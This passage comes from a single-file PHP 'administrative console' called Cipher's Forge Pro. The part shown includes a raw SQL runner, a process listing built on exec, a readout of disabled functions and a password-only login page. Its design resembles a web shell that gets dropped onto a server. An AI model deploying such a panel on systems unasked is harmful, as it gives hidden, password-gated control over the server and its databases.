            <div class="se-card-row"><span>Max Post:</span> <strong><?php echo se_esc_html($max_post); ?></strong></div>
            <div class="se-card-row"><span>Disabled Functions:</span> <strong style="color: #f87171; font-size: 11px;"><?php echo se_esc_html($disabled_functions); ?></strong></div>
        </div>

        <div class="se-card">
            <div class="se-card-title">💾 Disk Storage Usage</div>
            <div class="se-card-row"><span>Total Space:</span> <strong><?php echo $disk_total_gb; ?></strong></div>
            <div class="se-card-row"><span>Free Space:</span> <strong><?php echo $disk_free_gb; ?></strong></div>
            <div class="se-card-row"><span>Usage:</span> <strong><?php echo $disk_percent; ?>%</strong></div>
            <div style="background: var(--bg-tertiary); height: 10px; border-radius: 5px; margin-top: 15px; overflow: hidden;">
                <div style="background: var(--accent-gradient); width: <?php echo $disk_percent; ?>%; height: 100%;"></div>
            </div>
        </div>
    </div>
    <?php
}

// 4. Database Manager Tab
function se_render_db_tab() {
    $db_host = isset($_POST['db_host']) ? $_POST['db_host'] : (isset($_SESSION['se_db_host']) ? $_SESSION['se_db_host'] : 'localhost');
    $db_user = isset($_POST['db_user']) ? $_POST['db_user'] : (isset($_SESSION['se_db_user']) ? $_SESSION['se_db_user'] : '');
    $db_pass = isset($_POST['db_pass']) ? $_POST['db_pass'] : (isset($_SESSION['se_db_pass']) ? $_SESSION['se_db_pass'] : '');
    $db_name = isset($_POST['db_name']) ? $_POST['db_name'] : (isset($_SESSION['se_db_name']) ? $_SESSION['se_db_name'] : '');
    $sql_query = isset($_POST['sql_query']) ? $_POST['sql_query'] : 'SHOW TABLES;';

    $db_error = '';
    $query_results = null;
    $affected_rows = null;

    if (isset($_POST['se_connect_db']) || isset($_POST['se_run_sql'])) {
        $_SESSION['se_db_host'] = $db_host;
        $_SESSION['se_db_user'] = $db_user;
        $_SESSION['se_db_pass'] = $db_pass;
        $_SESSION['se_db_name'] = $db_name;

        try {
            $dsn = "mysql:host={$db_host}";
            if (!empty($db_name)) {
                $dsn .= ";dbname={$db_name}";
            }
            $pdo = new PDO($dsn, $db_user, $db_pass, array(
                PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
                PDO::DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC
            ));

            if (isset($_POST['se_run_sql']) && !empty($sql_query)) {
                $stmt = $pdo->prepare($sql_query);
                $stmt->execute();
                if ($stmt->columnCount() > 0) {
                    $query_results = $stmt->fetchAll();
                } else {
                    $affected_rows = $stmt->rowCount();
                }
            }
        } catch (PDOException $e) {
            $db_error = $e->getMessage();
        }
    }
    ?>
    <div style="margin-bottom: 25px;">
        <h2 style="font-size: 18px; font-weight: 700; margin-bottom: 15px;">🗄️ MySQL Database Connection</h2>
        
        <form method="post" action="">
            <input type="hidden" name="se_csrf_token" value="<?php echo se_esc_attr($_SESSION['se_csrf_token']); ?>">
            <div style="display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 15px;">
                <input type="text" name="db_host" value="<?php echo se_esc_attr($db_host); ?>" placeholder="Host (localhost)" class="se-input-text" style="width: 160px;" required>
                <input type="text" name="db_user" value="<?php echo se_esc_attr($db_user); ?>" placeholder="DB User" class="se-input-text" style="width: 160px;" required>
                <input type="password" name="db_pass" value="<?php echo se_esc_attr($db_pass); ?>" placeholder="DB Password" class="se-input-text" style="width: 160px;">
                <input type="text" name="db_name" value="<?php echo se_esc_attr($db_name); ?>" placeholder="Database Name" class="se-input-text" style="width: 160px;">
                <button type="submit" name="se_connect_db" value="1" class="se-btn">🔌 Connect</button>
            </div>
            
            <?php if (!empty($db_error)): ?>
                <div class="se-notice se-notice-error">❌ DB Error: <?php echo se_esc_html($db_error); ?></div>
            <?php endif; ?>

            <?php if (isset($_SESSION['se_db_user']) && empty($db_error)): ?>
                <div style="margin-top: 20px;">
                    <label class="se-label">SQL Query Runner</label>
                    <textarea name="sql_query" class="se-editor-textarea" style="height: 100px; margin-bottom: 10px;"><?php echo se_esc_html($sql_query); ?></textarea>
                    <button type="submit" name="se_run_sql" value="1" class="se-btn">⚡ Execute SQL Query</button>
                </div>
            <?php endif; ?>
        </form>
    </div>

    <?php if ($affected_rows !== null): ?>
        <div class="se-notice se-notice-success">✅ Query executed successfully. Affected Rows: <strong><?php echo $affected_rows; ?></strong></div>
    <?php endif; ?>

    <?php if ($query_results !== null): ?>
        <h3 style="font-size: 16px; font-weight: 700; margin-top: 20px;">Query Output (<?php echo count($query_results); ?> Rows)</h3>
        <div class="se-table-container">
            <table class="se-table">
                <thead>
                    <tr>
                        <?php 
                        if (!empty($query_results)) {
                            foreach (array_keys($query_results[0]) as $col) {
                                echo '<th>' . se_esc_html($col) . '</th>';
                            }
                        }
                        ?>
                    </tr>
                </thead>
                <tbody>
                    <?php if (empty($query_results)): ?>
                        <tr><td style="text-align: center; padding: 20px; color: var(--text-muted);">No records returned.</td></tr>
                    <?php else: ?>
                        <?php foreach ($query_results as $row): ?>
                            <tr>
                                <?php foreach ($row as $val): ?>
                                    <td><code><?php echo se_esc_html($val !== null ? $val : 'NULL'); ?></code></td>
                                <?php endforeach; ?>
                            </tr>
                        <?php endforeach; ?>
                    <?php endif; ?>
                </tbody>
            </table>
        </div>
    <?php endif; ?>
    <?php
}

// 5. Process Manager Tab
function se_render_processes_tab() {
    if (isset($_GET['status']) && $_GET['status'] === 'killed' && isset($_GET['pid'])) {
        echo '<div class="se-notice se-notice-success">⚡ Signal sent to terminate PID: <strong>' . intval($_GET['pid']) . '</strong></div>';
    }

    $is_windows = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');
    $output = '';
    
    if ($is_windows) {
        exec('tasklist /FO CSV 2>&1', $out);
        $output = implode("\n", $out);
    } else {
        exec('ps aux 2>&1', $out);
        $output = implode("\n", $out);
    }
    ?>
    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
        <h2 style="font-size: 18px; font-weight: 700; margin: 0;">⚡ System Running Processes</h2>
        <a href="<?php echo se_build_url(array('tab' => 'processes')); ?>" class="se-btn se-btn-sec se-btn-sm">🔄 Refresh List</a>
    </div>

    <div class="se-console-wrapper">
        <div class="se-console-header">
            <div class="se-console-dots">
                <span class="se-dot se-dot-red"></span>
                <span class="se-dot se-dot-yellow"></span>
                <span class="se-dot se-dot-green"></span>
            </div>
            <div class="se-console-title">Process Manager Output (<?php echo $is_windows ? 'tasklist' : 'ps aux'; ?>)</div>
            <div></div>
        </div>
        <pre class="se-console"><?php echo se_esc_html($output); ?></pre>
    </div>
    <?php
}

// === LOGIN PAGE RENDERER ===
function se_render_login_page($error_msg = '') {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login - Cipher's Forge Pro</title>
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;800&display=swap" rel="stylesheet">
        <style>
            :root {
                --bg-primary: #0b0f19;
                --bg-secondary: #131a26;
                --text-main: #f3f4f6;
                --text-muted: #9ca3af;
                --accent-color: #3b82f6;
                --accent-gradient: linear-gradient(135deg, #3b82f6 0%, #8b5cf6 100%);
                --border-color: #2e3b52;
                --font-outfit: 'Outfit', sans-serif;
            }

            body {
                font-family: var(--font-outfit);
                background-color: #05070c;
                color: var(--text-main);
                margin: 0;
                padding: 0;
                display: flex;
                align-items: center;
                justify-content: center;
                height: 100vh;
                overflow: hidden;
            }

            .login-card {
                background: var(--bg-primary);
                border: 1px solid var(--border-color);
                border-radius: 16px;
                padding: 40px;
                width: 100%;
                max-width: 400px;
                box-shadow: 0 15px 50px rgba(0, 0, 0, 0.5);
                text-align: center;
                position: relative;
            }

            .brand-title {
                font-size: 26px;
                font-weight: 800;
                background: var(--accent-gradient);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin-bottom: 10px;
            }

            .brand-subtitle {
                color: var(--text-muted);
                font-size: 14px;
                margin-bottom: 30px;
            }

            .input-group {
                margin-bottom: 20px;
                text-align: left;
            }

            .form-label {
                display: block;
                font-size: 13px;
                font-weight: 600;
                margin-bottom: 8px;
                color: var(--text-muted);
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }

            .form-input {
                width: 100%;
                box-sizing: border-box;
                background: var(--bg-secondary);
                border: 1px solid var(--border-color);
                border-radius: 8px;
                color: var(--text-main);
                padding: 12px 16px;
                font-size: 15px;
            }

            .form-input:focus {
                border-color: var(--accent-color);
                outline: none;
                box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.15);
            }

            .login-btn {
                width: 100%;
                background: var(--accent-gradient);
                color: white;
                border: none;
                padding: 12px;
                border-radius: 8px;
                font-size: 16px;
                font-weight: 600;
                cursor: pointer;
                box-shadow: 0 4px 12px rgba(59, 130, 246, 0.2);
            }

            .login-btn:hover {
                transform: translateY(-1px);
                box-shadow: 0 6px 18px rgba(59, 130, 246, 0.3);
            }

            .error-box {
                background: rgba(239, 68, 68, 0.1);
                border: 1px solid rgba(239, 68, 68, 0.2);
                color: #f87171;
                padding: 10px 14px;
                border-radius: 8px;
                margin-bottom: 20px;
                font-size: 14px;
                text-align: left;
            }
        </style>
    </head>
    <body>
        <div class="login-card">
            <div class="brand-title">🛡️ Cipher's Forge Pro</div>
            <div class="brand-subtitle">Standalone Administrative Console</div>
            
            <?php if (!empty($error_msg)): ?>
                <div class="error-box">
                    ❌ <?php echo htmlspecialchars($error_msg); ?>
                </div>
            <?php endif; ?>

            <form method="post" action="">
                <div class="input-group">
                    <label for="se_password" class="form-label">Forge Access Key</label>
                    <input type="password" id="se_password" name="se_password" class="form-input" placeholder="••••••••" required autofocus autocomplete="current-password">
                </div>
                <button type="submit" class="login-btn">Authenticate</button>
            </form>
        </div>
    </body>
    </html>
    <?php
}
